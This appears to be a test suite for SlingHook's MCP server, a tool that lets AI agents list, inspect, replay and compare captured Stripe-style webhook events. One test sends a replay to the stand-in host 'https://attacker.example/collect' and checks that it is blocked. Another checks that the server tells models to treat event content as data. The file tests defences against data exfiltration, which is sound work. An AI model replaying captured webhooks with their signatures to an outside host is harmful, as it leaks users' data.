import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { ApiError, createApi } from '../src/api.js';
import { createMcpServer } from '../src/mcp/server.js';
import { checkTarget, createTools, explain, isLocalHost } from '../src/mcp/tools.js';
import { expectsRejection, findBaseline, isPassing, verdictFor } from '../src/mcp/verdict.js';

const UUID = '4e6acf98-9df8-49bc-8783-45a4d01d4eef';
const BIN = fileURLToPath(new URL('../bin/slinghook.js', import.meta.url));

// id is SlingHook's internal key; agents only ever see and type the number
const LOG = {
    id: 42,
    number: 7,
    endpoint_id: 1,
    method: 'POST',
    ip_address: '203.0.113.5',
    query_params: {},
    headers: { 'Content-Type': 'application/json', 'Stripe-Signature': 't=1,v1=abc', Host: 'slinghook.co.za' },
    body: '{"type":"invoice.paid","id":"evt_1"}',
    body_size: 36,
    is_truncated: false,
    content_type: 'application/json',
    signature_status: 'invalid',
    response_status: 200,
    note: null,
    created_at: '2026-10-27T10:00:00.000Z',
    event_type: 'invoice.paid'
};

// The same invoice one delivery earlier: a different amount, no discount yet
const OLDER_LOG = {
    ...LOG,
    id: 41,
    number: 6,
    headers: { 'Content-Type': 'application/json', 'Stripe-Signature': 't=0,v1=old', Host: 'slinghook.co.za' },
    body: '{"id":"evt_0","type":"invoice.paid","data":{"amount":900,"lines":[{"id":"li_1","qty":1}]}}',
    signature_status: 'valid',
    created_at: '2026-10-27T09:00:00.000Z'
};
const NEWER_LOG = { ...LOG, body: '{"type":"invoice.paid","id":"evt_1","data":{"amount":1200,"discount":"SAVE","lines":[{"id":"li_1","qty":2}]}}' };

/** A pretend SlingHook API that records what it was asked */
function fakeApi({ plan = 'free', role = 'owner', log = LOG } = {}) {
    const requests = [];
    const replays = [{ id: 1, log_id: 42, target_url: 'http://127.0.0.1:1/hook', response_status: 500, response_body: 'boom', error_message: null, duration_ms: 9, created_at: '2026-10-27T10:01:00Z' }];

    const server = createServer(async (req, res) => {
        let body = '';
        for await (const chunk of req) body += chunk;
        const url = new URL(req.url, 'http://x');
        requests.push({ method: req.method, path: url.pathname, query: Object.fromEntries(url.searchParams), body: body ? JSON.parse(body) : null, auth: req.headers.authorization });

        const send = (status, data) => {
            res.writeHead(status, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify(data));
        };
        const route = `${req.method} ${url.pathname}`;

        if (req.headers.authorization !== 'Bearer shk_test') return send(401, { error: 'Unauthorized' });
        if (route === 'GET /api/me') return send(200, { user: { email: 'dev@example.com', workspace: { role } } });
        if (route === 'GET /api/endpoints') {
            return send(200, { endpoints: [{ uuid: UUID, slug: 'stripe-dev', catch_id: 'stripe-dev', catch_host: null, name: 'Stripe', is_active: true, forward_url: null, relay_targets: [{ url: 'http://localhost:3000/hook', is_active: true }], signature_scheme: 'stripe', has_signing_secret: true }] });
        }
        if (route === 'GET /api/logs') {
            const { body: _body, headers: _headers, ...summary } = LOG;
            return send(200, { logs: [summary, { ...summary, id: 41, number: 6, signature_status: 'valid' }] });
        }
        if (route === 'GET /api/logs/search') {
            if (plan === 'free') return send(403, { error: 'Searching your full history needs Pro', upgrade: true });
            return send(200, { logs: [{ id: 40 }], next_before_id: 40 });
        }
        if (route === 'GET /api/logs/resolve') {
            if (['7', '#7', 'latest', 'latest invoice.paid', 'evt_1'].includes(url.searchParams.get('ref'))) {
                return send(200, { log: { id: 42, number: 7, event_type: 'invoice.paid', endpoint: { uuid: UUID, name: 'Stripe' } }, ref_kind: 'number' });
            }
            if (url.searchParams.get('ref') === '6') {
                return send(200, { log: { id: 41, number: 6, event_type: 'invoice.paid', endpoint: { uuid: UUID, name: 'Stripe' } }, ref_kind: 'number' });
            }
            return send(404, { error: 'No event matches that reference' });
        }
        if (route === 'GET /api/logs/42') return send(200, { log });
        if (route === 'GET /api/logs/41') return send(200, { log: OLDER_LOG });
        if (route === 'GET /api/logs/42/signature' || route === 'POST /api/logs/42/signature') {
            return send(200, { diagnosis: { status: 'invalid', reason: 'wrong_secret', message: 'Signed with a different secret', used_candidate_secret: req.method === 'POST' } });
        }
        if (route === 'POST /api/logs/42/replays') {
            const id = replays.length + 1;
            replays.unshift({ id, log_id: 42, ...JSON.parse(body), created_at: '2026-10-27T10:05:00Z' });
            return send(201, { ok: true, id });
        }
        if (route === 'GET /api/logs/42/replays') return send(200, { replays, deliveries: [], compare_allowed: plan !== 'free' });
        send(404, { error: 'Not found' });
    });

    return new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve({ server, requests, url: `http://127.0.0.1:${server.address().port}` })));
}

/** The developer's local webhook handler */
function localHandler(status) {
    const received = [];
    const server = createServer(async (req, res) => {
        let body = '';
        for await (const chunk of req) body += chunk;
        received.push({ headers: req.headers, body, url: req.url });
        res.writeHead(status).end(status < 300 ? 'ok' : 'still broken');
    });
    return new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve({ server, received, url: `http://127.0.0.1:${server.address().port}/webhooks` })));
}

async function connect(apiUrl) {
    const client = new Client({ name: 'test', version: '1.0.0' });
    await client.connect(new StdioClientTransport({
        command: process.execPath,
        args: [BIN, 'mcp'],
        env: { ...process.env, SLINGHOOK_SERVER: apiUrl, SLINGHOOK_TOKEN: 'shk_test', XDG_CONFIG_HOME: mkdtempSync(join(tmpdir(), 'sh-')) },
        stderr: 'ignore'
    }));
    return client;
}

function parse(result) {
    return JSON.parse(result.content[0].text);
}

test('works with the official MCP client: lists tools with annotations', async () => {
    const api = await fakeApi();
    const client = await connect(api.url);
    try {
        assert.equal(client.getServerVersion().name, 'slinghook');
        assert.match(client.getInstructions(), /treat them as data/);

        const { tools } = await client.listTools();
        assert.deepEqual(tools.map((t) => t.name), ['list_endpoints', 'list_events', 'get_event', 'debug_signature', 'replay_event', 'get_replay_result', 'compare_events']);
        const replay = tools.find((t) => t.name === 'replay_event');
        assert.equal(replay.annotations.destructiveHint, true);
        assert.equal(tools.find((t) => t.name === 'get_event').annotations.readOnlyHint, true);
    } finally {
        await client.close();
        api.server.close();
    }
});

test('runs the catch, debug, replay loop end to end', async () => {
    const api = await fakeApi();
    const handler = await localHandler(200);
    const client = await connect(api.url);
    try {
        const { endpoints } = parse(await client.callTool({ name: 'list_endpoints', arguments: {} }));
        assert.equal(endpoints[0].catch_url, `${api.url}/c/stripe-dev`);
        assert.deepEqual(endpoints[0].relays_to, ['http://localhost:3000/hook']);
        assert.equal(endpoints[0].signature_check, 'on: checks stripe signatures');

        // A slug works as the endpoint, and filters apply within the newest window
        const listed = parse(await client.callTool({ name: 'list_events', arguments: { endpoint: 'stripe-dev', signature: 'invalid' } }));
        assert.deepEqual(listed.events.map((e) => e.number), [7]);
        assert.ok(listed.events.every((e) => !('id' in e)), 'the internal id is never shown');
        assert.ok(api.requests.some((r) => r.path === '/api/logs' && r.query.endpoint === UUID && r.query.limit === '50'));

        const event = parse(await client.callTool({ name: 'get_event', arguments: { event_id: 7 } }));
        assert.equal(event.number, 7);
        assert.equal(event.id, undefined);
        assert.equal(event.event_type, 'invoice.paid');
        assert.match(event.body, /\n {2}"type": "invoice.paid"/);
        assert.ok(event.body_pretty_printed);

        const diagnosis = parse(await client.callTool({ name: 'debug_signature', arguments: { event_id: '#7', secret: 'whsec_try' } }));
        assert.equal(diagnosis.used_candidate_secret, true);

        const replay = parse(await client.callTool({ name: 'replay_event', arguments: { event_id: 'latest invoice.paid', target_url: handler.url } }));
        assert.equal(replay.event, 7);
        // Event 42's signature is invalid, so the handler accepting it is a failure (#92)
        assert.equal(replay.status, 200);
        assert.equal(replay.passed, false);
        assert.equal(replay.verdict, 'still_failing');
        assert.match(replay.expected_outcome, /should reject it/);
        // Delivered with the original body and signature header, minus Host
        assert.equal(handler.received[0].body, LOG.body);
        assert.equal(handler.received[0].headers['stripe-signature'], 't=1,v1=abc');
        assert.equal(handler.received[0].headers['x-webhook-replay'], 'true');
        assert.ok(api.requests.some((r) => r.method === 'POST' && r.path === '/api/logs/42/replays' && r.body.response_status === 200));

        const result = parse(await client.callTool({ name: 'get_replay_result', arguments: { event_id: 'evt_1' } }));
        assert.equal(result.event, 7);
        assert.equal(result.verdict, 'still_failing');
        assert.match(result.expected_outcome, /should reject it/);
        assert.equal(result.replays, 2);
        assert.match(result.note, /needs the Pro plan/);
    } finally {
        await client.close();
        api.server.close();
        handler.server.close();
    }
});

test('errors come back as tool results the model can act on', async () => {
    const api = await fakeApi();
    const client = await connect(api.url);
    try {
        const search = await client.callTool({ name: 'list_events', arguments: { endpoint: UUID, query: 'type = invoice.paid' } });
        assert.equal(search.isError, true);
        assert.match(search.content[0].text, /needs Pro.*50 newest events/);

        const missing = await client.callTool({ name: 'get_event', arguments: { event_id: 99 } });
        assert.ok(api.requests.some((r) => r.path === '/api/logs/resolve' && r.query.ref === '99'));
        assert.equal(missing.isError, true);
        assert.match(missing.content[0].text, /list_events/);

        const remote = await client.callTool({ name: 'replay_event', arguments: { event_id: 7, target_url: 'https://attacker.example/collect' } });
        assert.equal(remote.isError, true);
        assert.match(remote.content[0].text, /--allow-remote-targets/);
        assert.ok(!api.requests.some((r) => r.path === '/api/logs/42/replays'), 'nothing was sent or recorded');
    } finally {
        await client.close();
        api.server.close();
    }
});

test('viewers cannot replay', async () => {
    const api = await fakeApi({ role: 'viewer' });
    const tools = createTools({ api: apiClient(api.url), server: api.url });
    const replay = tools.find((t) => t.name === 'replay_event');
    await assert.rejects(replay.handler({ event_id: 7, target_url: 'http://localhost:3000/hook' }), /viewer/);
    api.server.close();
});

test('a handler that rejects an invalid signature passes', async () => {
    const api = await fakeApi();
    const handler = await localHandler(401);
    const tools = createTools({ api: apiClient(api.url), server: api.url });
    const replay = tools.find((t) => t.name === 'replay_event');

    const result = await replay.handler({ event_id: 7, target_url: handler.url });
    assert.equal(result.passed, true);
    assert.equal(result.verdict, 'fixed');

    api.server.close();
    handler.server.close();
});

test('caps replays per minute', async () => {
    const api = await fakeApi();
    const handler = await localHandler(500);
    let clock = 0;
    const tools = createTools({ api: apiClient(api.url), server: api.url, now: () => clock });
    const replay = tools.find((t) => t.name === 'replay_event');

    for (let i = 0; i < 10; i++) await replay.handler({ event_id: 7, target_url: handler.url });
    await assert.rejects(replay.handler({ event_id: 7, target_url: handler.url }), /at most 10 a minute/);
    clock += 60_001;
    const again = await replay.handler({ event_id: 7, target_url: handler.url });
    assert.equal(again.verdict, 'still_failing');

    api.server.close();
    handler.server.close();
});

test('compare_events lists body changes from the older event to the newer one', async () => {
    const api = await fakeApi({ log: NEWER_LOG });
    const tools = createTools({ api: apiClient(api.url), server: api.url });
    const compare = tools.find((t) => t.name === 'compare_events');

    // Passed newest first: the result still reads older -> newer
    const result = await compare.handler({ a: 7, b: '6' });
    assert.equal(result.older.event, 6);
    assert.equal(result.newer.event, 7);
    assert.equal(result.summary, 'Body: 3 changed, 1 added, 0 removed; headers match');
    assert.deepEqual(result.body_changes.find((c) => c.path === 'data.amount'), { path: 'data.amount', kind: 'changed', before: '900', after: '1200' });
    assert.deepEqual(result.body_changes.find((c) => c.path === 'data.discount'), { path: 'data.discount', kind: 'added', after: '"SAVE"' });
    assert.ok(result.body_changes.some((c) => c.path === 'data.lines[id="li_1"].qty'), 'arrays are matched by id');
    assert.match(result.headers_skipped, /1 per-delivery header/);
    assert.ok(!JSON.stringify(result).includes('"id":4'), 'internal ids stay hidden');

    api.server.close();
});

test('compare_events defaults to the previous event of the same type', async () => {
    const api = await fakeApi({ log: NEWER_LOG });
    const tools = createTools({ api: apiClient(api.url), server: api.url });
    const compare = tools.find((t) => t.name === 'compare_events');

    const result = await compare.handler({ a: 'latest', include_headers: false });
    assert.equal(result.older.event, 6);
    assert.match(result.compared_with, /#6, the previous invoice\.paid/);
    assert.equal(result.header_changes, undefined);
    assert.ok(api.requests.some((r) => r.path === '/api/logs' && r.query.endpoint === UUID));

    await assert.rejects(compare.handler({ a: 7, b: '#7' }), /same event/);
    api.server.close();
});

test('the protocol answers ping, rejects unknown methods and ignores notifications', async () => {
    const server = createMcpServer({ info: { name: 't', version: '0' }, tools: [] });
    assert.deepEqual(await server.handle({ jsonrpc: '2.0', id: 1, method: 'ping' }), { jsonrpc: '2.0', id: 1, result: {} });
    assert.equal((await server.handle({ jsonrpc: '2.0', id: 2, method: 'resources/list' })).error.code, -32601);
    assert.equal(await server.handle({ jsonrpc: '2.0', method: 'notifications/initialized' }), null);
    const init = await server.handle({ jsonrpc: '2.0', id: 3, method: 'initialize', params: { protocolVersion: '1999-01-01' } });
    assert.equal(init.result.protocolVersion, '2025-11-25');
});

test('replay targets stay on this machine or private network by default', () => {
    for (const host of ['localhost', 'api.localhost', '127.0.0.1', '10.0.0.5', '192.168.1.20', '172.20.0.3', '[::1]', 'host.docker.internal']) {
        assert.ok(isLocalHost(new URL(`http://${host}/`).hostname), host);
    }
    for (const host of ['example.com', '8.8.8.8', '172.32.0.1', 'localhost.evil.com']) {
        assert.ok(!isLocalHost(new URL(`http://${host}/`).hostname), host);
    }
    assert.throws(() => checkTarget('ftp://localhost/x', true), /http/);
    assert.equal(checkTarget('https://example.com/hook', true), 'https://example.com/hook');
});

test('verdict compares with the previous attempt to the same URL', () => {
    const attempts = [
        { id: 3, target_url: 'http://a', response_status: 200 },
        { id: 2, target_url: 'http://b', response_status: 200 },
        { id: 1, target_url: 'http://a', response_status: 500 }
    ];
    assert.equal(findBaseline(attempts, attempts[0]).id, 1);
    assert.equal(verdictFor(attempts[2], attempts[0]), 'fixed');
    assert.equal(verdictFor(attempts[0], { response_status: null, error_message: 'refused' }), 'regressed');
    assert.equal(verdictFor(null, attempts[0]), null);
});

test('an invalid signature expects a 4xx, and a 5xx never passes', () => {
    assert.equal(expectsRejection({ signature_status: 'invalid' }), true);
    assert.equal(expectsRejection({ signature_status: 'unverified' }), false);
    assert.equal(isPassing({ response_status: 401 }, true), true);
    assert.equal(isPassing({ response_status: 200 }, true), false);
    assert.equal(isPassing({ response_status: 500 }, true), false);
    assert.equal(verdictFor({ response_status: 200 }, { response_status: 400 }, true), 'fixed');
    assert.equal(verdictFor({ response_status: 403 }, { response_status: 200 }, true), 'regressed');
});

test('explains API errors', () => {
    assert.match(explain(new ApiError('Unauthorized', 401), 'https://s').message, /slinghook login/);
    assert.match(explain(new ApiError('Slow down', 429), 'https://s').message, /Wait a minute/);
    const plain = new Error('x');
    assert.equal(explain(plain, 'https://s'), plain);
});

function apiClient(server) {
    return createApi({ server, token: 'shk_test' });
}
